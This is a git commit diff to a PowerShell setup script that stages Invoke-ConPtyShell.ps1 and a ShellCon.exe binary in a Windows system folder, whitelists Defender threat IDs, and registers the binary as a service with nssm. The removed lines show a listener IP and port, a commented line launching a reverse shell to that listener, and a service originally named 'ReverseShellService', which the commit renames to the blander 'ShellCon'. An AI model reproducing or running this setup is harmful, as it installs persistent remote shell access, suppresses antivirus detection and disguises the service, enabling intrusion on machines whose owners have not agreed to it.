e4442944f8689439e89209af8e3edfe7d16d708b
Mircox <mircea.rautoiu@gmail.com>
2021-12-25 23:45:32 +0200

    Add service creation functionality in setup

--- Setup.ps1
+++ Setup.ps1
@@ -1,7 +1,3 @@
-#connection variables:
-$ListenerIP = "192.168.145.236"
-$ListenerPort = "35500"
-
 #threats to be allowed
 $threat1 = "2147773719"
 $threat2 = "2147780248"
@@ -20,11 +16,13 @@ Copy-Item -Path Z:\Invoke-ConPtyShell.ps1 -Destination C:\Windows\Setup\State\In
 #copy service exe:
 Copy-Item -Path Z:\ShellCon.exe -Destination C:\Windows\Setup\State\ShellCon.exe
 
-#run connection script:
-#IEX(IWR C:\Windows\Setup\State\Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $ListenerIP $ListenerPort
-
 #create service:
-$ServiceName = "ShellCon.exe"
-$ServiceDisplayName = "ReverseShellService"
+$ServiceName = "ShellCon"
 $ExecPath = "C:\Windows\Setup\State\ShellCon.exe"
-New-Service -name $ServiceName -binaryPathName $ExecPath -displayName $ServiceDisplayName -startupType Manual
+$AppDirectory = "C:\Windows\Setup\State"
+
+nssm install $ServiceName $ExecPath
+nssm set $ServiceName AppDirectory $AppDirectory
+nssm set $ServiceName DisplayName $ServiceName
+nssm set $ServiceName Start SERVICE_DEMAND_START
+nssm set $ServiceName AppStopMethodConsole 30000
